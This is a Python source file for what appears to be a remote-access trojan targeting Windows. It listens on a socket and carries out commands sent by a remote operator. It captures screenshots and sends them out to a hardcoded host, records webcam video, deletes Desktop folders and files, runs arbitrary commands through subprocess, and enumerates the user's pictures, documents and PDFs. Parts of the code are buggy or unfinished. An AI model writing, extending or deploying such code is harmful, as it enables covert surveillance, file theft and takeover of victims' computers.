import socket
from PIL import ImageGrab
from PIL import Image
import time
import os
import shutil
import cv2
import time
import glob
import urllib
import base64
IP = "0.0.0.0"
port = 8002
import numpy
import subprocess
Id_des="127.0.0.1"
global KEEP
KEEP = True
def getpath():
    #get the user
    #global userr
    userr = os.getlogin()
    return r"C:\Users\%s" %userr
#todo -to conjoin this function
"""
def save_delete_snapshot():
    snapshot = ImageGrab.grab()
    save_path = getpath()
    save_path = "%s\Desktop\dheimgg.jpg" %save_path
    snapshot.save("%s" %save_path)
    #image=Image.open("%s" %save_path)
    with open(("%s" %save_path),  'rb' ) as thefile:
        #global data
        daata = thefile.read()
    time.sleep(3)
    #os.remove('%s' %save_path)
"""
def main():
    global KEEP
    KEEP = True
    get_in = True
    while KEEP:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((IP, port))
        server_socket.listen(1)
        client_socket, client_address = server_socket.accept()
        try:
            msg = client_socket.recv(1024)
            print("in the try")
            get_in = True
        except:
            #todo -replace KEEP to alternative
            #KEEP = False
            print("lost connection")
            client_socket.close()
            #server_socket.close()
            get_in= False
            #break
        if get_in:
            msg = msg.decode()
            msg = msg.upper()
            print (msg)
            if msg == "TAKE SCREEN SHOT":   #take screen shot and send it to client
                snapshot = ImageGrab.grab()
                save_path = getpath()
                print("1")
                save_path = "%s\Desktop\dheimgg.jpg" %save_path
                #print(save_path)
                snapshot.save("%s" %save_path)
                end = False
                #image=Image.open("%s" %save_path)
                times_uploaded = 0
                with open(("%s" %save_path),  'rb' ) as thefile:
                    data = thefile.read()
                print("2")
                os.remove('%s' %save_path)
                server_socket.close()
                client_socket.close()
                print("3")
                #temmperate client
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print("4")
                client_socket.connect((Id_des, 8072))
                end = 1024
                print("5")
                start = 0
                #img_bytes = image.tobytes()
                first_time = True
                #global data
                #save_delete_snapshot()

                while len(data)>=1:#ppp was for chek what was sent
                        mess = data[start:end]
                        if first_time:
                            ppp =mess
                            first_time=False
                        else:
                            ppp = ppp+mess
                            first_time=False

                        data = data[(end):]

                        #first_time = False
                        print("6")
                        client_socket.send(mess)
                exixx = "exit"
                exixx = exixx.encode()
                client_socket.send(exixx)


                print("7")
                client_socket.close()

            elif msg == "SHOW FOLDER":
                t_file = client_socket.recv(1024)
                files_list = glob.glob(t_file+"\\*.*")
                print (files_list)
                client_socket.close()
                server_socket.close()
            elif msg == "DELETE FOLDER":
                t_file = client_socket.recv(1024)
                keep = False
                #todo -replace the paths with getpath()
                try:
                    shutil.rmtree('C:\\Users\\tomme\\Desktop\\%s' %t_file, ignore_errors=False)
                    keep = False
                except:
                    keep = True
                if keep:
                    try:
                        os.remove('C:\\Users\\tomme\\Desktop\\python1\\%s.jpg' %t_file)
                        keep = False
                    except:
                        keep = True
                if keep:
                    try:
                        os.remove('C:\\Users\\tomme\\Desktop\\python1\\%s.txt'%t_file)
                    except:
                        print("there is no %s folder/there is a typo/there is no acsses to this file"%t_file)
                server_socket.close()
                client_socket.close()
            elif msg == "EXECUTE":
                command = client_socket.recv(1024)
                try:
                    subprocess.call(command)
                except:
                    (r'C:\Windows\%s'%command)
                client_socket.close()

            elif msg =="TAKE":
                pathy = getpath()
                print(pathy)
                what_to_take = client_socket.recv(1024)
                what_to_take = what_to_take.decode()
                what_to_take = what_to_take.upper()
                file_type=""
                if what_to_take=="PICTURES":
                    file_type="pictures"
                elif what_to_take=="BATCH":
                    file_type = ".bat"
                elif what_to_take=="DOCUMENTS":
                    file_type = "documents"
                elif what_to_take=="PDF":
                    file_type = ".pdf"
                files = []
                #r=root d=directories f=files
                #todo change the array from paths to bytes
                if file_type=="pictures":

                    for r,d,f in os.walk(pathy):
                        for filee in f:

                            if '.png' in filee or '.jpeg' in filee or '.jpg' in filee:
                                #print(f)
                                files.append(os.path.join(r,filee))

                elif file_type=="documents":
                    for r,d,f in os.walk(pathy):
                        for filee in f:

                            if '.doc' in filee or '.docx' in filee:
                                #print(f)
                                files.append(os.path.join(r,filee))
                else:
                    for r,d,f in os.walk(pathy):
                        for filee in f:

                            if '%s'%file_type in filee:
                                #print(f)
                                files.append(os.path.join(r,filee))

                #todo send the list to client
                for f in files:
                    print(f)
            elif msg=="TAKE VIDEO":
                print("wow")
                capture_duration = 10
                cap = cv2.VideoCapture(0)
                fourcc = cv2.VideoWriter_fourcc(*'XVID')
                pathh=getpath()
                print("hellllllllllllllo")
                out = cv2.VideoWriter(r"%s\thevideo.avi" %pathh,fourcc, 20.0, (640,480))
                start_time = time.time()
                while( int(time.time() - start_time) < capture_duration ):
                    ret, frame = cap.read()
                    if ret==True:
                        frame = cv2.flip(frame,0)
                        out.write(frame)
                        cv2.imshow('frame',frame)
                    else:
                        break
                cap.release()
                out.release()
                cv2.destroyAllWindows()
                #convert to bytes
                with open(r"%s\thevideo.avi", "rb") as file:
                    bytes = file.read() # read the bytes
                #todo: delete video from setver computer,send bytes
                client_socket.send(bytes)
            else:
                #todo make exeption
                print("your command isnt avilable")
                server_socket.close()
                client_socket.close()












if __name__ == '__main__':
    main()
